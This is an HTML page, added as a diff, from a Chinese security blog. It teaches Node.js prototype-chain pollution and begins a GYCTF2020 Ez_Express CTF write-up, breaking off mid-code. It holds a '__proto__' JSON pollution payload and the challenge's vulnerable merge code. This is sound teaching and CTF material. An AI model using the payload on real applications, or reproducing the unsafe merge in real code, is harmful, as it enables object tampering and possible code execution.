@@ -1,0 +1,752 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="CTF,Java,Web,JavaScript,Linux">
+    <meta name="description" content="记录一些奇奇怪怪乱七八糟的东西">
+    <meta name="author" content="y1zh3e7">
+    
+    <title>
+        
+            Nodejs原型链污染 |
+        
+        y1’s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.jpg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/logo.jpg","favicon":"/images/logo.jpg","avatar":"/images/avatar.jpg","font_size":"21px","font_family":"STHeiti","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/cover.jpg","description":"一只坐牢的web🐶 || 懂进攻知防守，先正向后逆向","font_color":"#FFFFFF","hitokoto":false},"scroll":{"progress_bar":true,"percent":true}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"yCemvr5nGXrJlWRCN3SLWLLy-MdYXbMMI","appkey":"7gIuYJ9YQk94en6wRudankYd","server_urls":"https://ycemvr5n.api.lncldglobal.com","placeholder":"Hi speak something！"},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"center","copyright_info":false},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.0.0-rc1">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/logo.jpg">
+                </a>
+            
+            <a class="logo-title" href="/">
+               y1’s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">Nodejs原型链污染</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/avatar.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">y1zh3e7</span>
+                            
+                                <span class="author-label">Lv1</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2023-04-21 10:11:04</span>
+        <span class="mobile">2023-04-21 10:11</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-04-21 10:13:31</span>
+    </span>
+    
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/WebSec/">WebSec</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">原型链污染</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>3.3k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>14 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <h1 id="Nodejs原型链污染"><a href="#Nodejs原型链污染" class="headerlink" title="Nodejs原型链污染"></a>Nodejs原型链污染</h1><h2 id="Nodejs与JavaScript和JSON"><a href="#Nodejs与JavaScript和JSON" class="headerlink" title="Nodejs与JavaScript和JSON"></a>Nodejs与JavaScript和JSON</h2><p>有一些人在学习JavaScript时会分不清Nodejs和JavaScript之间的区别 如果没有node 那么我们的JavaScript代码则由浏览器中的JavaScript解析器进行解析 几乎所有的浏览器都配备了JavaScript的解析功能（最出名的就是google的v8） 这也是为什么我们能在f12中直接执行JavaScript的原因  而Nodejs则是由这个解析器单独从浏览器中拿出来 并进行了一系列的处理 最后成为了一个可以在服务端运行JavaScript的环境  这里看到一个很好的例子 学过java的师傅应该就明白了</p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207300014261.png"></p>
+<p>那么JSON又是什么呢 简单概括一下就是JavaScript的对象表示方法 它表示的是声明对象的一种格式  由于我们从前端接收到的数据基本都是字符串 因此在服务端如果要将这些字符串处理为其他格式 比如对象 就需要用到JSON了 </p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207300023195.png"></p>
+<h2 id="原型对象（prototype）与原型连接点（-proto-）与原型链"><a href="#原型对象（prototype）与原型连接点（-proto-）与原型链" class="headerlink" title="原型对象（prototype）与原型连接点（__proto__）与原型链"></a>原型对象（<code>prototype</code>）与原型连接点（<code>__proto__</code>）与原型链</h2><p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301459737.png"></p>
+<p>在c++或java这些面向对象的语言中 我们如果想要一个对象首先需要使用关键字class声明一个类 再使用关键字new一个对象出来 但是在JavaScript中没有class 以及类这种概念（为了简化编写JavaScript代码，ECMAScript 6后增加了<code>class</code>语法，但<code>class</code>其实只是一个语法糖） 在JavaScript有这么两种声明对象的方式 为了好理解我们先引入类的思想</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">person=<span class="keyword">new</span> <span class="title class_">Object</span>()</span><br><span class="line">person.<span class="property">firstname</span>=<span class="string">"John"</span>;</span><br><span class="line">person.<span class="property">lastname</span>=<span class="string">"Doe"</span>;</span><br><span class="line">person.<span class="property">age</span>=<span class="number">50</span>;</span><br><span class="line">person.<span class="property">eyecolor</span>=<span class="string">"blue"</span>;</span><br><span class="line"></span><br><span class="line">这种创建对象的方法还有另一种写法 如下</span><br><span class="line">person={<span class="attr">firstname</span>:<span class="string">"John"</span>,<span class="attr">lastname</span>:<span class="string">"Doe"</span>,<span class="attr">age</span>:<span class="number">50</span>,<span class="attr">eyecolor</span>:<span class="string">"blue"</span>};</span><br><span class="line"></span><br><span class="line">这种方法通过直接实例化构造方法<span class="title class_">Object</span>()来创建对象</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">person</span>(<span class="params">firstname,lastname,age,eyecolor</span>)  这里创建了一个“类” 但是在<span class="title class_">JavaScript</span>中叫做构造函数或者构造器</span><br><span class="line">{</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">firstname</span>=firstname;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">lastname</span>=lastname;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span>=age;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">eyecolor</span>=eyecolor;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">var</span> myFather=<span class="keyword">new</span> <span class="title function_">person</span>(<span class="string">"John"</span>,<span class="string">"Doe"</span>,<span class="number">50</span>,<span class="string">"blue"</span>);	通过这个“类”实例化对象</span><br><span class="line"><span class="keyword">var</span> myMother=<span class="keyword">new</span> <span class="title function_">person</span>(<span class="string">"Sally"</span>,<span class="string">"Rally"</span>,<span class="number">48</span>,<span class="string">"green"</span>);</span><br><span class="line"></span><br><span class="line">这种方法先创建构造函数 再实例化构造函数 构造函数<span class="keyword">function</span>也属于<span class="title class_">Object</span> 如果对这里为什么属于<span class="title class_">Object</span>而不属于<span class="title class_">Function</span>有疑问请继续阅读 下面会解释</span><br></pre></td></tr></tbody></table></figure>
+
+<p>既然是通过实例化Object来创建对象或创建构造函数</p>
+<p> 在JavaScript中有两个很特殊的对象 Function() 和 Object()  它们两个既是构造函数也是对象 作为对象是不是应该有一个“类”去作为他们的模板呢</p>
+<p>对于Object()来说 要声明这么一个构造函数我们可以使用关键字function来创建 （在底层 使用function创建一个函数 其实就相当于这个过程） </p>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Object</span>(<span class="params"></span>)</span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line">在底层为</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Object</span> = <span class="keyword">new</span> <span class="title class_">Function</span>();</span><br></pre></td></tr></tbody></table></figure>
+
+<p>那么对于Function自己这个对象他是怎么来的呢 如果用Function.<code>__proto__</code>和Function.prototype进行比较发现二者是全等的 所以Function创造了自己 也创造了Object 所以JavaScript中 所有函数都是对象 而对象是通过函数创建的 因此<code>构造函数.prototype.__proto__ </code>应该是Object.prototype 而不是Function.prototype   Function的作用是创建而不是继承</p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301402091.png"></p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301401083.png"></p>
+<p>那么提到了<code>__proto__</code>和<code>prototype</code>我们就来说说这两个是什么东西</p>
+<p>首先我们要了解以下概念</p>
+<ul>
+<li><code>__proto__</code>是任何一个对象拥有的属性    <code>prototype</code>是任何一个函数拥有的一个属性  </li>
+</ul>
+<p>比如</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">person={<span class="attr">firstname</span>:<span class="string">"John"</span>,<span class="attr">lastname</span>:<span class="string">"Doe"</span>,<span class="attr">age</span>:<span class="number">50</span>,<span class="attr">eyecolor</span>:<span class="string">"blue"</span>};</span><br></pre></td></tr></tbody></table></figure>
+
+<p>那么这个person对象就拥有了<code>person.__proto__</code>这个属性 而Object()我们刚才提到了是由Function创建来的一个构造函数 那么Object就天生有了Object.prototype </p>
+<ul>
+<li>某一对象的 <code>__proto__</code>指向它的prototype（原型对象） 也就是说如果直接访问<code>person.__proto__</code> 那么就相当于访问了Object.prototype</li>
+<li>JavaScript使用prototype链实现继承机制</li>
+<li>构造函数xxx.prototype是一个对象 xxx.prototype也有自己的<code>__proto__</code>属性 并且可以继续指向它的的prototype</li>
+<li>Object.prototype.proto最终指向null 这也是所有原型链的终点</li>
+<li>从一个对象的<code>__proto__</code>不断向上指向原型对象最终指向Objecct.prototype后接着指向为Null 这一条链子就叫做原型链</li>
+</ul>
+<p>有条件的师傅也可以把下面的视频合集看一下 对理解原型和原型链有很大的帮助</p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1ci4y157Ci?p=4&amp;spm_id_from=333.1007.top_right_bar_window_history.content.click&amp;vd_source=ce28d3130b8ba56f85e090c857c00132">4_Function与Object的特殊性_哔哩哔哩_bilibili<i class="fas fa-external-link-alt"></i></a></p>
+<p> 如果我们有如下代码：</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">'Donald'</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">last_name</span> = <span class="string">'Trump'</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">'Melania'</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">${son.first_name}</span> <span class="subst">${son.last_name}</span>`</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>那么按照上述说法 就有如下结构</p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301504781.png"></p>
+<p>对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：</p>
+<ol>
+<li>在对象son中寻找last_name</li>
+<li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li>
+<li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li>
+<li>依次寻找，直到找到<code>null</code>结束。</li>
+</ol>
+<h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h2><p>举个栗子</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这个对象直接实例化Object()</span></span><br><span class="line"><span class="keyword">let</span> foo = {<span class="attr">bar</span>: <span class="number">1</span>}</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> zoo = {}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看zoo.bar</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301540927.png"></p>
+<p>这里由于修改了<code>foo.__proto__.bar</code> 也就是修改了Object.bar 因此在后续的实例化对象中 新的对象会继承这一属性 造成了原型链污染</p>
+<p>在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？</p>
+<p>我们思考一下，哪些情况下我们可以设置<code>__proto__</code>的值呢？其实找找能够控制数组（对象）的“键名”的操作即可</p>
+<p>看下面代码 一个简单的对象clone</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) {</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) {</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) {  </span><br><span class="line">            <span class="comment">// 如果target与source有相同的键名 则让target的键值为source的键值</span></span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            target[key] = source[key]  <span class="comment">// 如果target与source没有相通的键名 则直接在target新建键名并赋给键值</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">let</span> o1 = {}</span><br><span class="line"><span class="keyword">let</span> o2 = {<span class="attr">a</span>: <span class="number">1</span>, <span class="string">"__proto__"</span>: {<span class="attr">b</span>: <span class="number">2</span>}}</span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">o3 = {}</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301550219.png"></p>
+<p>这里执行后发现 虽然两个对象成功clone 但是Object()并没用被污染 这是因为在创建o2时 <code>__proto__</code>是已经存在于o2中的属性了 解析器并不能将这个属性解析为键值 所以要用JSON去修改代码（前面我们说了 JSON是JavaScript的对象表示方法 可以将字符串转换为对象） 这样就可以使<code>__proto__</code>被成功解析成键名了</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = {}</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">'{"a": 1, "__proto__": {"b": 2}}'</span>)</span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">o3 = {}</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301555313.png"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h3><p>进入环境之后是一个登录页面 测试之后发现存在<a class="link" target="_blank" rel="noopener" href="http://www.zip源码泄露/">www.zip源码泄露<i class="fas fa-external-link-alt"></i></a> 开始审计index.js</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; {</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) {</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) {</span><br><span class="line">      <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">}</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; {</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">merge</span>({}, a);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">safeKeyword</span>(<span class="params">keyword</span>) {</span><br><span class="line">  <span class="keyword">if</span>(keyword.<span class="title function_">match</span>(<span class="regexp">/(admin)/i</span>s)) {</span><br><span class="line">      <span class="keyword">return</span> keyword</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">'/'</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) {</span><br><span class="line">  <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>){</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">'/login'</span>);</span><br><span class="line">  }</span><br><span class="line">  res.<span class="property">outputFunctionName</span>=<span class="literal">undefined</span>;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">'index'</span>,data={<span class="string">'user'</span>:req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>});</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">'/login'</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) {</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">'login'</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">'/login'</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) {</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">"register"</span>){</span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_">safeKeyword</span>(req.<span class="property">body</span>.<span class="property">userid</span>)){</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">"&lt;script&gt;alert('forbid word');history.go(-1);&lt;/script&gt;"</span>) </span><br><span class="line">   }</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">user</span>={</span><br><span class="line">      <span class="string">'user'</span>:req.<span class="property">body</span>.<span class="property">userid</span>.<span class="title function_">toUpperCase</span>(),</span><br><span class="line">      <span class="string">'passwd'</span>: req.<span class="property">body</span>.<span class="property">pwd</span>,</span><br><span class="line">      <span class="string">'isLogin'</span>:<span class="literal">false</span></span><br><span class="line">    }</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span 